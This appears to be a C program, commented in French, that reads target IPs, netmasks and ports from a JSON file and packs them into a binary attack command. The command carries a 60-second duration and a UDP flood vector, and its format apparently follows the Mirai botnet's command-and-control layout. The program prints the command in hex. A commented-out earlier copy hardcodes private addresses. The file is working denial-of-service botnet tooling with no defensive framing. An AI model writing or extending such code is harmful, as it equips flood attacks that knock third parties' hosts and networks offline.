#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <arpa/inet.h>

#include <cjson/cJSON.h>

#define ATK_VEC_UDP   0
#define ATK_OPT_DPORT 7

struct target_entry {
    char *ip_str;
    uint8_t netmask;
};

struct option_entry {
    uint8_t key;
    char *value;  // Ex: "80"
};

int main() {
    // Lecture du fichier JSON
    FILE *fp = fopen("targets.json", "r");
    if (!fp) {
        perror("Erreur ouverture fichier JSON");
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    rewind(fp);

    char *json_data = malloc(fsize + 1);
    fread(json_data, 1, fsize, fp);
    fclose(fp);
    json_data[fsize] = '\0';

    cJSON *root = cJSON_Parse(json_data);
    if (!root) {
        fprintf(stderr, "Erreur de parsing JSON\n");
        free(json_data);
        return 1;
    }

    cJSON *targets_json = cJSON_GetObjectItem(root, "targets");
    if (!cJSON_IsArray(targets_json)) {
        fprintf(stderr, "Format JSON invalide : 'targets' attendu comme tableau\n");
        cJSON_Delete(root);
        free(json_data);
        return 1;
    }

    int target_count = cJSON_GetArraySize(targets_json);
    int option_count = target_count; // Chaque cible a son propre port ici

    struct target_entry *targets = malloc(sizeof(struct target_entry) * target_count);
    struct option_entry *options = malloc(sizeof(struct option_entry) * option_count);

    for (int i = 0; i < target_count; i++) {
        cJSON *t = cJSON_GetArrayItem(targets_json, i);
        const char *ip = cJSON_GetObjectItem(t, "ip")->valuestring;
        int netmask = cJSON_GetObjectItem(t, "netmask")->valueint;
        int port = cJSON_GetObjectItem(t, "port")->valueint;

        targets[i].ip_str = strdup(ip);
        targets[i].netmask = (uint8_t)netmask;

        options[i].key = ATK_OPT_DPORT;
        options[i].value = malloc(6);
        snprintf(options[i].value, 6, "%d", port);
    }

    // Construction du buffer d'attaque
    uint8_t buffer[1024];
    int offset = 0;

    uint32_t duration = htonl(60);  // 60 secondes
    uint8_t attack_vector = ATK_VEC_UDP;

    // 1. Durée
    memcpy(buffer + offset, &duration, sizeof(uint32_t));
    offset += sizeof(uint32_t);

    // 2. Type d'attaque
    buffer[offset++] = attack_vector;

    // 3. Nombre de cibles
    buffer[offset++] = (uint8_t)target_count;

    // 4. Données des cibles
    for (int i = 0; i < target_count; i++) {
        struct in_addr addr;
        inet_aton(targets[i].ip_str, &addr);
        memcpy(buffer + offset, &addr.s_addr, sizeof(uint32_t));
        offset += sizeof(uint32_t);
        buffer[offset++] = targets[i].netmask;
    }

    // 5. Nombre d'options
    buffer[offset++] = (uint8_t)option_count;

    // 6. Données des options
    for (int i = 0; i < option_count; i++) {
        uint8_t val_len = (uint8_t)strlen(options[i].value);
        buffer[offset++] = options[i].key;
        buffer[offset++] = val_len;
        memcpy(buffer + offset, options[i].value, val_len);
        offset += val_len;
    }

    // Affichage du buffer en hexadécimal
    printf("Buffer (%d octets):\n", offset);
    for (int i = 0; i < offset; i++) {
        printf("%02X ", buffer[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    // Nettoyage
    for (int i = 0; i < target_count; i++) {
        free(targets[i].ip_str);
        free(options[i].value);
    }
    free(targets);
    free(options);
    cJSON_Delete(root);
    free(json_data);

    return 0;
}


/* #include <stdio.h> */
/* #include <stdlib.h> */
/* #include <stdint.h> */
/* #include <string.h> */
/* #include <arpa/inet.h> */

/* #define ATK_VEC_UDP        0 */
/* #define ATK_OPT_DPORT      7 */

/* // Structure d'aide pour remplir les données */
/* struct target_entry { */
/*     char *ip_str; */
/*     uint8_t netmask; */
/* }; */

/* struct option_entry { */
/*     uint8_t key; */
/*     char *value;  // chaîne de caractères, exemple: "80" */
/* }; */

/* int main() { */
/*     uint8_t buffer[1024]; */
/*     int offset = 0; */

/*     // Paramètres à encoder */
/*     uint32_t duration = htonl(60);  // 60 secondes */
/*     uint8_t attack_vector = ATK_VEC_UDP; */
/*     struct target_entry targets[] = { */
/*         {"192.168.1.1", 24}, */
/*         {"10.0.0.1", 8} */
/*     }; */
/*     int target_count = sizeof(targets) / sizeof(targets[0]); */

/*     struct option_entry options[] = { */
/*         {ATK_OPT_DPORT, "80"} */
/*     }; */
/*     int option_count = sizeof(options) / sizeof(options[0]); */

/*     // 1. Durée */
/*     memcpy(buffer + offset, &duration, sizeof(uint32_t)); */
/*     offset += sizeof(uint32_t); */

/*     // 2. Vecteur */
/*     buffer[offset++] = attack_vector; */

/*     // 3. Nombre de cibles */
/*     buffer[offset++] = (uint8_t)target_count; */

/*     // 4. Cibles (IPv4 + netmask) */
/*     for (int i = 0; i < target_count; i++) { */
/*         struct in_addr addr; */
/*         inet_aton(targets[i].ip_str, &addr); */
/*         memcpy(buffer + offset, &addr.s_addr, sizeof(uint32_t)); */
/*         offset += sizeof(uint32_t); */

/*         buffer[offset++] = targets[i].netmask; */
/*     } */

/*     // 5. Nombre d’options */
/*     buffer[offset++] = (uint8_t)option_count; */

/*     // 6. Options */
/*     for (int i = 0; i < option_count; i++) { */
/*         uint8_t val_len = (uint8_t)strlen(options[i].value); */
/*         buffer[offset++] = options[i].key; */
/*         buffer[offset++] = val_len; */
/*         memcpy(buffer + offset, options[i].value, val_len); */
/*         offset += val_len; */
/*     } */

/*     // Afficher le buffer en hexadécimal */
/*     printf("Buffer (%d octets):\n", offset); */
/*     for (int i = 0; i < offset; i++) { */
/*         printf("%02X ", buffer[i]); */
/*         if ((i + 1) % 16 == 0) printf("\n"); */
/*     } */
/*     printf("\n"); */

/*     return 0; */
/* } */
